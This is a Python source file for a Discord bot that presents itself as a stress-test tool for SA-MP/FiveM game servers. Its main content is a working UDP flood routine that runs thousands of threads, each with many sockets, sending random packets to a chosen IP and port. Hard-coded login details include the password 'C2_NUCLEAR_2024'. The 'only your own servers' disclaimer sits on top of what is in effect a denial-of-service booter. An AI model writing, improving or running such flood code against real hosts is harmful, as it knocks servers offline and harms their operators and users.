#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ⚡ DEVELOPED BY LI ZANDYA - SERVER STRESS TEST TOOL ⚡
# 🔥 TEST YOUR OWN SAMP/FIVEM SERVERS ONLY 🔥
# ⚠️ ONLY USE ON SERVERS YOU OWN! ⚠️

import discord
from discord.ext import commands
from discord.ui import Button, View, Modal, TextInput
import asyncio
import aiohttp
import random
import socket
import struct
import time
import os
import ipaddress
import hashlib
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# ============================================
# بيانات تسجيل الدخول - LI ZANDYA SYSTEM
# ============================================
REQUIRED_IP = "187.121.21.12"
REQUIRED_USERNAME = "LI ZANDYA"
REQUIRED_PASSWORD = "C2_NUCLEAR_2024"
TOKEN = "YOUR_BOT_TOKEN_HERE"  # ضع التوكن الخاص بك هنا

# ============================================
# إعدادات القوة القصوى
# ============================================
CPU_CORES = os.cpu_count() or 8
MAX_THREADS = CPU_CORES * 50000
MAX_PACKET_SIZE = 65507

try:
    import psutil
    TOTAL_RAM = psutil.virtual_memory().total // (1024**3)
except:
    TOTAL_RAM = 8

USER_AGENTS = []
for v in range(100, 200):
    USER_AGENTS.append(f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/{v}.0.0.0 Safari/537.36")

class StressTester:
    def __init__(self):
        self.running = False
        self.stats = {
            'total_packets': 0,
            'total_bytes': 0,
            'total_tests': 0,
            'active_tests': 0,
            'start_time': None,
            'peak_speed': 0,
            'total_errors': 0,
        }
        self.threads = min(MAX_THREADS, 50000)
        self.test_log = []
        self.authenticated = False
        self.authenticated_user = None
        self.active_tests = {}
        self.executor = ThreadPoolExecutor(max_workers=self.threads)

    def check_auth(self, ip: str, username: str, password: str) -> bool:
        if ip == REQUIRED_IP and username.upper() == REQUIRED_USERNAME and password == REQUIRED_PASSWORD:
            self.authenticated = True
            self.authenticated_user = username
            return True
        return False

    def log_test(self, test_type: str, target: str, duration: int, packets: int, bytes_sent: int, errors: int = 0):
        rate = packets / duration if duration > 0 else 0
        if rate > self.stats['peak_speed']:
            self.stats['peak_speed'] = rate
        self.test_log.append({
            'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'type': test_type,
            'target': target,
            'duration': duration,
            'packets': packets,
            'bytes': bytes_sent,
            'rate': rate,
            'errors': errors
        })
        if len(self.test_log) > 100:
            self.test_log.pop(0)

    async def udp_test(self, ip: str, port: int, duration: int) -> tuple:
        self.running = True
        if not self.stats['start_time']:
            self.stats['start_time'] = time.time()
        
        self.stats['active_tests'] += 1
        test_id = f"UDP_{ip}_{port}_{int(time.time())}"
        self.active_tests[test_id] = time.time()
        
        sent = 0
        bytes_sent = 0
        errors = 0
        
        def udp_worker():
            nonlocal sent, bytes_sent, errors
            socks = []
            for _ in range(100):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    sock.setblocking(False)
                    socks.append(sock)
                except:
                    errors += 1
            
            start = time.time()
            while self.running and time.time() - start < duration:
                for sock in socks:
                    try:
                        pkt = os.urandom(random.randint(1024, 8192))
                        sock.sendto(pkt, (ip, port))
                        sent += 1
                        bytes_sent += len(pkt)
                    except:
                        errors += 1
            
            for sock in socks:
                sock.close()
        
        workers = min(self.threads, 5000)
        futures = [self.executor.submit(udp_worker) for _ in range(workers)]
        
        await asyncio.sleep(duration)
        self.running = False
        
        for f in futures:
            try:
                f.result(timeout=1)
            except:
                pass
        
        self.stats['total_packets'] += sent
        self.stats['total_bytes'] += bytes_sent
        self.stats['active_tests'] -= 1
        self.stats['total_tests'] += 1
        
        del self.active_tests[test_id]
        self.log_test("UDP TEST", f"{ip}:{port}", duration, sent, bytes_sent, errors)
        
        rate = sent / duration
        mbps = (bytes_sent / duration) / 1024 / 1024
        
        return sent, f"✅ UDP TEST COMPLETED!\nTarget: {ip}:{port}\nDuration: {duration}s\nPackets: {sent:,}\nRate: {rate:,.0f} pps\nBandwidth: {mbps:.2f} Mbps"

    async def stop(self):
        self.running = False
        return "⏹️ ALL TESTS STOPPED!"

tester = StressTester()

# ============================================
# البوت الرئيسي
# ============================================
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f"Bot is ready! Logged in as {bot.user}")

@bot.command()
async def login(ctx):
    await ctx.send("Login system is ready!")

@bot.command()
async def von(ctx):
    embed = discord.Embed(title="Stress Test Panel", description="Select an option below", color=0xFF0000)
    await ctx.send(embed=embed)

# ============================================
# تشغيل البوت
# ============================================
if __name__ == "__main__":
    print("Starting bot...")
    print("Please set your TOKEN before running!")
    # bot.run(TOKEN)  # قم بإلغاء التعليق بعد وضع التوكن الصحيح
